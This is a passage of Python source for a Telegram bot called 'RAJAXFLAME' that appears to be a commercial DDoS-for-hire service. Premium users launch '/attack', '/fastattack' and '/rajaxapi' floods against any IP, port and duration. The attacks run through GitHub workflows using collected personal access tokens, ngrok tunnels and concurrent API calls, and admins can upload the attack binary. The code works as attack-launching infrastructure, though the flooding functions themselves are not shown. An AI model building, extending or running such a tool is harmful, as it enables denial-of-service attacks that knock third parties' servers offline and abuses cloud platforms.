<b>Attack Configuration:</b>
<code>/threads N</code> - Set default threads
<code>/setconcurrent N</code> - Set API concurrency
<code>/file</code> - Upload binary

<b>Attack Commands:</b>
<code>/attack ip port time</code> - Combined Tunnel Attack
<code>/fastattack ip port time</code> - Ultra-fast Parallel Attack
<code>/rajaxapi ip port time</code> - API only
<code>/status</code> - Check attacks
<code>/mystats</code> - Your statistics
<code>/history</code> - Attack history

<b>Tunnel Management:</b>
<code>/tunnels</code> - Show active tunnels
<code>/cleartunnels</code> - Clear all tunnels
            """.strip()
        else:
            text = """
🎯 <b>RAJAXFLAME USER COMMANDS</b>

<b>Main Attacks:</b>
<code>/attack ip port time</code> - Launch combined tunnel attack
<code>/fastattack ip port time</code> - Ultra-fast parallel attack
<code>/rajaxapi ip port time</code> - API only attack

<b>Token Management:</b>
<code>/settoken</code> - Add your GitHub tokens
<code>/check</code> - Check your tokens
<code>/addngrok token</code> - Add ngrok tokens
<code>/listngrok</code> - List your tokens
<code>/removengrok prefix</code> - Remove tokens

<b>Status & History:</b>
<code>/status</code> - Attack status
<code>/mystats</code> - Your statistics
<code>/history</code> - Your attack history
<code>/tunnels</code> - Active tunnels status

<b>Utilities:</b>
<code>/help</code> - This message
            """.strip()
        
        await update.message.reply_text(text, parse_mode='HTML')
        print(f"✅ Help sent to user {user_id}")
    except Exception as e:
        print(f"❌ Error in cmd_help: {e}")
        await update.message.reply_text("❌ Error showing help")

async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        print(f"📊 Mystats command from user {user_id}")
        
        # Users data safely load karo
        users = get_users()
        user_info = users.get(str(user_id), {})
        
        # User status check karo
        status = "🔴 STANDARD"
        days_left = 0
        
        if user_info:
            try:
                expires_str = user_info.get("expires", "")
                if expires_str:
                    expires = datetime.fromisoformat(expires_str.replace("Z", "+00:00"))
                    current_time = datetime.utcnow()
                    days_left = max(0, (expires - current_time).days)
                    status = f"🟢 PREMIUM ({days_left} days left)"
                else:
                    status = "🔴 STANDARD (No expiration date)"
            except Exception as e:
                print(f"❌ Error parsing expiration: {e}")
                status = "🔴 STANDARD (Error)"
        else:
            status = "🔴 STANDARD"
        
        # Tokens count karo
        user_tokens = [ln for ln in load_all_token_lines() if ln.startswith(f"{user_id}:")]
        valid_tokens = 0
        
        for line in user_tokens:
            try:
                _, token = line.split(":", 1)
                if validate_github_token(token):
                    valid_tokens += 1
            except:
                continue
        
        # Attack history
        history = get_attack_history(user_id)
        
        # Active tunnels
        active_tunnels = tunnel_manager.get_active_tunnel_count()
        
        # Ngrok tokens
        ngrok_tokens = len(get_ngrok_tokens())
        
        # Final stats message banayo
        stats_msg = f"""
📊 <b>RAJAXFLAME USER STATS</b>

╔══════════════════════╗
║     👤 USER INFO     ║
╠══════════════════════╣
║ • ID: <code>{user_id}</code>
║ • Status: {status}
║ • GitHub Tokens: {valid_tokens}/{len(user_tokens)} valid
║ • Ngrok Tokens: {ngrok_tokens}
║ • Active Tunnels: {active_tunnels}
║ • Total Attacks: {len(history)}
║ • Admin: {'✅ YES' if is_admin(user_id) else '❌ NO'}
║ • Owner: {'✅ YES' if is_owner(user_id) else '❌ NO'}
╚══════════════════════╝

💡 <i>Use /settoken to add GitHub tokens</i>
        """.strip()
        
        await update.message.reply_text(stats_msg, parse_mode='HTML')
        print(f"✅ Stats sent successfully to user {user_id}")
        
    except Exception as e:
        print(f"❌ Error in cmd_mystats: {e}")
        await update.message.reply_text("📊 <b>Your Basic Stats</b>\n\n• User ID: {}\n• Status: ACTIVE\n• Owner: YES".format(update.effective_user.id), parse_mode='HTML')

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        chat_id = update.effective_chat.id
        status_msg = create_attack_status_message(chat_id)
        await update.message.reply_text(status_msg, parse_mode='HTML')
        print(f"✅ Status sent to chat {chat_id}")
    except Exception as e:
        print(f"❌ Error in cmd_status: {e}")
        await update.message.reply_text("❌ Error fetching status")

def create_attack_status_message(chat_id: int) -> str:
    active_attacks = ACTIVE_ATTACKS.get(chat_id, [])
    
    if not active_attacks:
        return "🔴 <b>No active attacks</b>\n\nUse /attack to start a new attack!"
    
    message = "🎯 <b>RAJAXFLAME ATTACK DASHBOARD</b>\n\n"
    
    for i, attack in enumerate(active_attacks, 1):
        target = attack.get('target', 'Unknown')
        method = attack.get('method', 'Mixed')
        time_remaining = attack.get('time_remaining', '00:00:00')
        progress = attack.get('progress', 0)
        progress_bar = create_progress_bar(progress)
        
        message += f"<b>Attack #{i}</b>\n"
        message += f"╔══════════════════════╗\n"
        message += f"║ 🎯 {target:<16} ║\n"
        message += f"║ ⚡ {method:<16} ║\n"
        message += f"║ ⏰ {time_remaining:<16} ║\n"
        message += f"║ {progress_bar:<20} ║\n"
        message += f"║ 📊 {progress:>3}% Complete    ║\n"
        message += f"╚══════════════════════╝\n\n"
    
    message += "🔄 <i>Use /status to refresh</i>"
    return message

async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        
        if update.message.document and update.message.document.file_name.endswith(".txt"):
            file = await update.message.document.get_file()
            path = await file.download_to_drive()
            cnt = 0
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    tok = line.strip()
                    if tok:
                        save_token_line(uid, tok)
                        cnt += 1
            os.remove(path)
            await update.message.reply_text(f"✅ <b>Saved {cnt} RAJAXFLAME token(s)</b>", parse_mode='HTML')
        else:
            text = update.message.text.replace("/settoken", "").strip() if update.message.text else ""
            if not text:
                await update.message.reply_text("📝 <b>Send PAT tokens or upload .txt file</b>\n\nExample: <code>/settoken ghp_abc123 ghp_xyz456</code>", parse_mode='HTML')
                return
            tokens = [t.strip() for t in text.split() if t.strip()]
            for tok in tokens:
                save_token_line(uid, tok)
            await update.message.reply_text(f"✅ <b>Saved {len(tokens)} RAJAXFLAME token(s)</b>", parse_mode='HTML')
        
        print(f"✅ Tokens saved for user {uid}")
    except Exception as e:
        print(f"❌ Error in cmd_settoken: {e}")
        await update.message.reply_text("❌ Error saving tokens")

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        user = update.effective_user
        
        print(f"🎯 Advanced Attack command from user {uid}")
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>RAJAXFLAME Access Denied</b>\nContact owners for premium access.", parse_mode='HTML')
            return
        
        if len(context.args) != 3:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/attack ip port duration</code>\n\nExample: <code>/attack 1.1.1.1 80 60</code>", parse_mode='HTML')
            return
        
        ip, port, duration = context.args
        
        try:
            port_int = int(port)
            duration_int = int(duration)
        except ValueError:
            await update.message.reply_text("❌ Port and duration must be integers")
            return

        # Create attack ID
        attack_id = f"advanced_attack_{int(time.time())}_{random.randint(1000, 9999)}"
        end_time = datetime.utcnow() + timedelta(seconds=duration_int)
        
        # Initialize attack tracking
        if chat_id not in ACTIVE_ATTACKS:
            ACTIVE_ATTACKS[chat_id] = []
        
        attack_data = {
            'id': attack_id,
            'target': f"{ip}:{port}",
            'method': 'Combined+Tunnel',
            'duration': f"{duration}s",
            'start_time': datetime.utcnow(),
            'end_time': end_time,
            'time_remaining': format_time_remaining(end_time),
            'progress': 0,
            'user_id': uid,
            'stats': {}
        }
        
        ACTIVE_ATTACKS[chat_id].append(attack_data)
        
        # Send initiation message
        user_tokens = [ln for ln in load_all_token_lines() if ln.startswith(f"{uid}:")]
        valid_tokens = [t.split(":", 1)[1] for t in user_tokens if validate_github_token(t.split(":", 1)[1])]
        
        init_msg = f"""
🚀 <b>ADVANCED COMBINED ATTACK STARTING</b>

╔══════════════════════╗
║     🎯 TARGET        ║
╠══════════════════════╣
║ • IP: <code>{ip}</code>
║ • Port: {port}
║ • Duration: {duration}s
║ • Method: Combined+Tunnel
╚══════════════════════╝

⚡ <b>Initializing:</b>
• GitHub Workflows ({len(valid_tokens)} tokens)
• Ngrok Tunnels ({len(valid_tokens)} tunnels)  
• Direct API Calls ({get_concurrent()} concurrent)

⏳ <i>Setting up attack infrastructure...</i>
        """.strip()
        
        msg = await update.message.reply_text(init_msg, parse_mode='HTML')
        
        # Start enhanced attack process
        asyncio.create_task(execute_parallel_attacks(context, chat_id, attack_id, ip, port, duration, uid, msg))
        
    except Exception as e:
        print(f"❌ Error in cmd_attack: {e}")
        await update.message.reply_text(f"❌ Attack Error: {str(e)}")

async def cmd_fastattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ultra-fast parallel attack"""
    try:
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        user = update.effective_user
        
        print(f"⚡ Fast Attack command from user {uid}")
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>RAJAXFLAME Access Denied</b>\nContact owners for premium access.", parse_mode='HTML')
            return
        
        if len(context.args) != 3:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/fastattack ip port duration</code>\n\nExample: <code>/fastattack 1.1.1.1 80 60</code>", parse_mode='HTML')
            return
        
        ip, port, duration = context.args
        
        try:
            port_int = int(port)
            duration_int = int(duration)
        except ValueError:
            await update.message.reply_text("❌ Port and duration must be integers")
            return

        # Create attack ID
        attack_id = f"fast_attack_{int(time.time())}_{random.randint(1000, 9999)}"
        end_time = datetime.utcnow() + timedelta(seconds=duration_int)
        
        # Initialize attack tracking
        if chat_id not in ACTIVE_ATTACKS:
            ACTIVE_ATTACKS[chat_id] = []
        
        attack_data = {
            'id': attack_id,
            'target': f"{ip}:{port}",
            'method': 'Fast+Parallel',
            'duration': f"{duration}s",
            'start_time': datetime.utcnow(),
            'end_time': end_time,
            'time_remaining': format_time_remaining(end_time),
            'progress': 0,
            'user_id': uid,
            'stats': {}
        }
        
        ACTIVE_ATTACKS[chat_id].append(attack_data)
        
        # Send initiation message
        user_tokens = [ln for ln in load_all_token_lines() if ln.startswith(f"{uid}:")]
        valid_tokens = [t.split(":", 1)[1] for t in user_tokens if validate_github_token(t.split(":", 1)[1])]
        
        init_msg = f"""
⚡ <b>ULTRA-FAST PARALLEL ATTACK STARTING</b>

╔══════════════════════╗
║     🎯 TARGET        ║
╠══════════════════════╣
║ • IP: <code>{ip}</code>
║ • Port: {port}
║ • Duration: {duration}s
║ • Method: Fast+Parallel
╚══════════════════════╝

🚀 <b>Initializing Parallel Attacks:</b>
• GitHub Workflows ({len(valid_tokens[:2])} tokens)
• Ngrok Tunnels ({len(valid_tokens)} tunnels)  
• Direct API Calls ({get_concurrent()} concurrent)

⏳ <i>Launching all attacks simultaneously...</i>
        """.strip()
        
        msg = await update.message.reply_text(init_msg, parse_mode='HTML')
        
        # Start ultra-fast parallel attack process
        asyncio.create_task(execute_parallel_attacks(context, chat_id, attack_id, ip, port, duration, uid, msg))
        
    except Exception as e:
        print(f"❌ Error in cmd_fastattack: {e}")
        await update.message.reply_text(f"❌ Fast Attack Error: {str(e)}")

async def cmd_rajaxapi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        
        print(f"🔥 API Attack command from user {uid}")
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>RAJAXFLAME Access Denied</b>\nContact owners for premium access.", parse_mode='HTML')
            return
        
        if len(context.args) != 3:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/rajaxapi ip port duration</code>\n\nExample: <code>/rajaxapi 1.1.1.1 80 60</code>", parse_mode='HTML')
            return
        
        ip, port, duration = context.args
        
        try:
            port_int = int(port)
            duration_int = int(duration)
        except ValueError:
            await update.message.reply_text("❌ Port and duration must be integers")
            return

        # Save attack to history
        save_attack_history(uid, {
            'target': f"{ip}:{port}",
            'duration': duration_int,
            'method': 'API Only',
            'start_time': datetime.utcnow().isoformat(),
            'tokens_used': 0
        })

        # Send attack message
        attack_msg = f"""
🔥 <b>RAJAXFLAME API ATTACK</b>

╔══════════════════════╗
║     🎯 TARGET        ║
╠══════════════════════╣
║ • IP: <code>{ip}</code>
║ • Port: {port}
║ • Duration: {duration}s
║ • Method: API Only
╚══════════════════════╝

⚡ <b>Firing API attacks...</b>
        """.strip()
        
        msg = await update.message.reply_text(attack_msg, parse_mode='HTML')
        
        # Perform API attacks
        concurrent = get_concurrent()
        api_success = 0
        
        for i in range(concurrent):
            if call_api_attack(ip, port, duration):
                api_success += 1
            await asyncio.sleep(0.5)
        
        result_msg = f"""
✅ <b>RAJAXFLAME API ATTACK COMPLETED</b>

╔══════════════════════╗
║     📊 RESULTS       ║
╠══════════════════════╣
║ • Target: {ip}:{port}
║ • Duration: {duration}s
║ • API Calls: {api_success}/{concurrent}
║ • Status: Success
╚══════════════════════╝
        """.strip()
        
        await msg.edit_text(result_msg, parse_mode='HTML')
        print(f"✅ API attack completed for user {uid}")
        
    except Exception as e:
        print(f"❌ Error in cmd_rajaxapi: {e}")
        await update.message.reply_text(f"❌ API Attack Error: {str(e)}")

# Tunnel management commands
async def cmd_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show active tunnels status"""
    try:
        uid = update.effective_user.id
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>Access Denied</b>", parse_mode='HTML')
            return
        
        tunnel_status = tunnel_manager.get_tunnel_status()
        active_count = tunnel_manager.get_active_tunnel_count()
        
        if not tunnel_status:
            await update.message.reply_text("🌐 <b>No active tunnels</b>", parse_mode='HTML')
            return
        
        status_msg = f"🌐 <b>ACTIVE TUNNELS STATUS</b>\n\n"
        status_msg += f"📊 Total Active: {active_count}\n\n"
        
        for i, (token_prefix, tunnel_info) in enumerate(tunnel_status.items(), 1):
            status_msg += f"<b>Tunnel {i}:</b>\n"
            status_msg += f"• Token: {token_prefix}\n"
            status_msg += f"• URL: <code>{tunnel_info['url']}</code>\n"
            status_msg += f"• Port: {tunnel_info['port']}\n"
            status_msg += f"• Status: 🟢 {tunnel_info['status'].upper()}\n\n"
        
        await update.message.reply_text(status_msg, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Tunnel Status Error:</b> {str(e)}", parse_mode='HTML')

async def cmd_cleartunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all active tunnels"""
    try:
        uid = update.effective_user.id
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>Access Denied</b>", parse_mode='HTML')
            return
        
        active_count = tunnel_manager.get_active_tunnel_count()
        tunnel_manager.stop_all_tunnels()
        
        await update.message.reply_text(
            f"🗑️ <b>Cleared {active_count} active tunnels</b>", 
            parse_mode='HTML'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Clear Tunnels Error:</b> {str(e)}", parse_mode='HTML')

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's attack history"""
    try:
        uid = update.effective_user.id
        history = get_attack_history(uid)
        
        if not history:
            await update.message.reply_text("📝 <b>No attack history found</b>", parse_mode='HTML')
            return
        
        # Show last 10 attacks
        recent_attacks = history[-10:]
        history_msg = "📊 <b>YOUR ATTACK HISTORY</b>\n\n"
        
        for i, attack in enumerate(reversed(recent_attacks), 1):
            target = attack.get('target', 'Unknown')
            duration = attack.get('duration', 0)
            method = attack.get('method', 'Unknown')
            timestamp = attack.get('timestamp', '')
            
            # Format timestamp
            try:
                dt = datetime.fromisoformat(timestamp.replace('Z', '+00:00'))
                time_str = dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                time_str = "Unknown time"
            
            history_msg += f"<b>Attack #{i}</b>\n"
            history_msg += f"• Target: <code>{target}</code>\n"
            history_msg += f"• Duration: {duration}s\n"
            history_msg += f"• Method: {method}\n"
            history_msg += f"• Time: {time_str}\n\n"
        
        await update.message.reply_text(history_msg, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>History Error:</b> {str(e)}", parse_mode='HTML')

# Admin commands
async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if len(context.args) != 2:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/add userid days</code>\n\nExample: <code>/add 123456789 30</code>", parse_mode='HTML')
            return
        try:
            target = int(context.args[0])
            days = int(context.args[1])
            add_user(target, days)
            await update.message.reply_text(f"✅ <b>User {target} approved for {days} days</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid userid or days")
    except Exception as e:
        print(f"❌ Error in cmd_add: {e}")

async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/threads 4000</code>", parse_mode='HTML')
            return
        try:
            val = int(context.args[0])
            set_default_threads(val)
            await update.message.reply_text(f"✅ <b>Threads set to {val}</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid number")
    except Exception as e:
        print(f"❌ Error in cmd_threads: {e}")

async def cmd_setconcurrent(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/setconcurrent 3</code>", parse_mode='HTML')
            return
        try:
            val = int(context.args[0])
            set_concurrent(val)
            await update.message.reply_text(f"✅ <b>Concurrent API calls set to {val}</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid number")
    except Exception as e:
        print(f"❌ Error in cmd_setconcurrent: {e}")

async def cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if not os.path.exists(USERS_FILE):
            save_json(USERS_FILE, {})
        await update.message.reply_document(InputFile(USERS_FILE), caption="📊 <b>RAJAXFLAME Users Database</b>", parse_mode='HTML')
    except Exception as e:
        print(f"❌ Error in cmd_users: {e}")

async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        msg = await update.message.reply_text("🔍 <b>Checking RAJAXFLAME tokens...</b>", parse_mode='HTML')
        
        lines = load_all_token_lines()
        if is_admin(uid):
            results = {}
            for line in lines:
                u, tok = line.split(":", 1)
                alive = validate_github_token(tok)
                results.setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
            save_json(TOKENS_STATUS_FILE, results)
            await update.message.reply_document(InputFile(TOKENS_STATUS_FILE), caption="📊 <b>RAJAXFLAME Token Status</b>", parse_mode='HTML')
        else:
            own = [ln for ln in lines if ln.startswith(f"{uid}:")]
            live = dead = 0
            for line in own:
                _, tok = line.split(":", 1)
                if validate_github_token(tok):
                    live += 1
                else:
                    dead += 1
            await msg.edit_text(f"📊 <b>Your Token Status</b>\n✅ Live: {live}\n❌ Dead: {dead}", parse_mode='HTML')
    except Exception as e:
        print(f"❌ Error in cmd_check: {e}")

async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/remove userid</code>", parse_mode='HTML')
            return
        try:
            target = int(context.args[0])
            remove_user(target)
            await update.message.reply_text(f"✅ <b>User {target} removed</b>", parse_mode='HTML')
        except ValueError:
            await update.message.reply_text("❌ Invalid userid")
    except Exception as e:
        print(f"❌ Error in cmd_remove: {e}")

async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        if not is_admin(uid):
            await update.message.reply_text("❌ <b>Admin access required</b>", parse_mode='HTML')
            return
        await update.message.reply_text(f"📁 <b>Upload RAJAXFLAME binary named '{BINARY_NAME}'</b>", parse_mode='HTML')
    except Exception as e:
        print(f"❌ Error in cmd_file: {e}")

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        doc = update.message.document
        if not doc:
            return
        if doc.file_name == BINARY_NAME:
            if os.path.exists(BINARY_PATH):
                os.remove(BINARY_PATH)
            f = await doc.get_file()
            await f.download_to_drive(custom_path=BINARY_PATH)
            await update.message.reply_text(f"✅ <b>RAJAXFLAME Binary '{BINARY_NAME}' updated</b>", parse_mode='HTML')
            print(f"✅ Binary updated by user {update.effective_user.id}")
    except Exception as e:
        print(f"❌ Error in on_document: {e}")

# ---- Application Builder ----
def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("mystats", cmd_mystats))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("history", cmd_history))
    app.add_handler(CommandHandler("tunnels", cmd_tunnels))
    app.add_handler(CommandHandler("cleartunnels", cmd_cleartunnels))
    app.add_handler(CommandHandler("settoken", cmd_settoken))
    app.add_handler(CommandHandler("addngrok", cmd_addngrok))
    app.add_handler(CommandHandler("listngrok", cmd_listngrok))
    app.add_handler(CommandHandler("removengrok", cmd_removengrok))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("fastattack", cmd_fastattack))
    app.add_handler(CommandHandler("rajaxapi", cmd_rajaxapi))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("setconcurrent", cmd_setconcurrent))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("file", cmd_file))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    
    return app

# ---- Cleanup Handler ----
import atexit

@atexit.register
def cleanup_on_exit():
    """Cleanup tunnels when bot stops"""
    print("🔄 Cleaning up ngrok tunnels...")
    tunnel_manager.stop_all_tunnels()

if __name__ == "__main__":
    # Check if another instance is already running
    if not check_singleton():
        print("💡 To kill other instances, run: pkill -f 'python3 mix.py'")
        sys.exit(1)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    print("🔥 Starting RAJAXFLAME Bot with Enhanced Tunnel System...")
    print(f"👑 Owners: {DEVELOPER_TAG}")
    
    # Initialize backend services
    print("🔄 Initializing backend services...")
    
    # 1. Start API Server
    start_api_server()
    time.sleep(2)
    
    # 2. Start Ngrok Service
    if tunnel_manager.start_ngrok_service():
        print("✅ Ngrok service started successfully")
    else:
        print("⚠️ Ngrok service failed - tunnel features disabled")
    
    # 3. Initialize files if not exists
    if not os.path.exists(USERS_FILE):
        save_json(USERS_FILE, {})
        print("✅ Users file initialized")
    
    if not os.path.exists(ATTACK_HISTORY_FILE):
        save_json(ATTACK_HISTORY_FILE, {})
        print("✅ Attack history file initialized")
        
    if not os.path.exists(NGROK_TOKENS_FILE):
        save_json(NGROK_TOKENS_FILE, {"tokens": []})
        print("✅ Ngrok tokens file initialized")
    
    print("🚀 ALL SYSTEMS READY - Starting bot...")
    
    try:
        app = build_app()
        app.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
    except Conflict as e:
        print(f"❌ Conflict Error: {e}")
        print("💡 Another bot instance is still running. Kill it with: pkill -f 'python3 mix.py'")
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
        tunnel_manager.stop_all_tunnels()
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        tunnel_manager.stop_all_tunnels()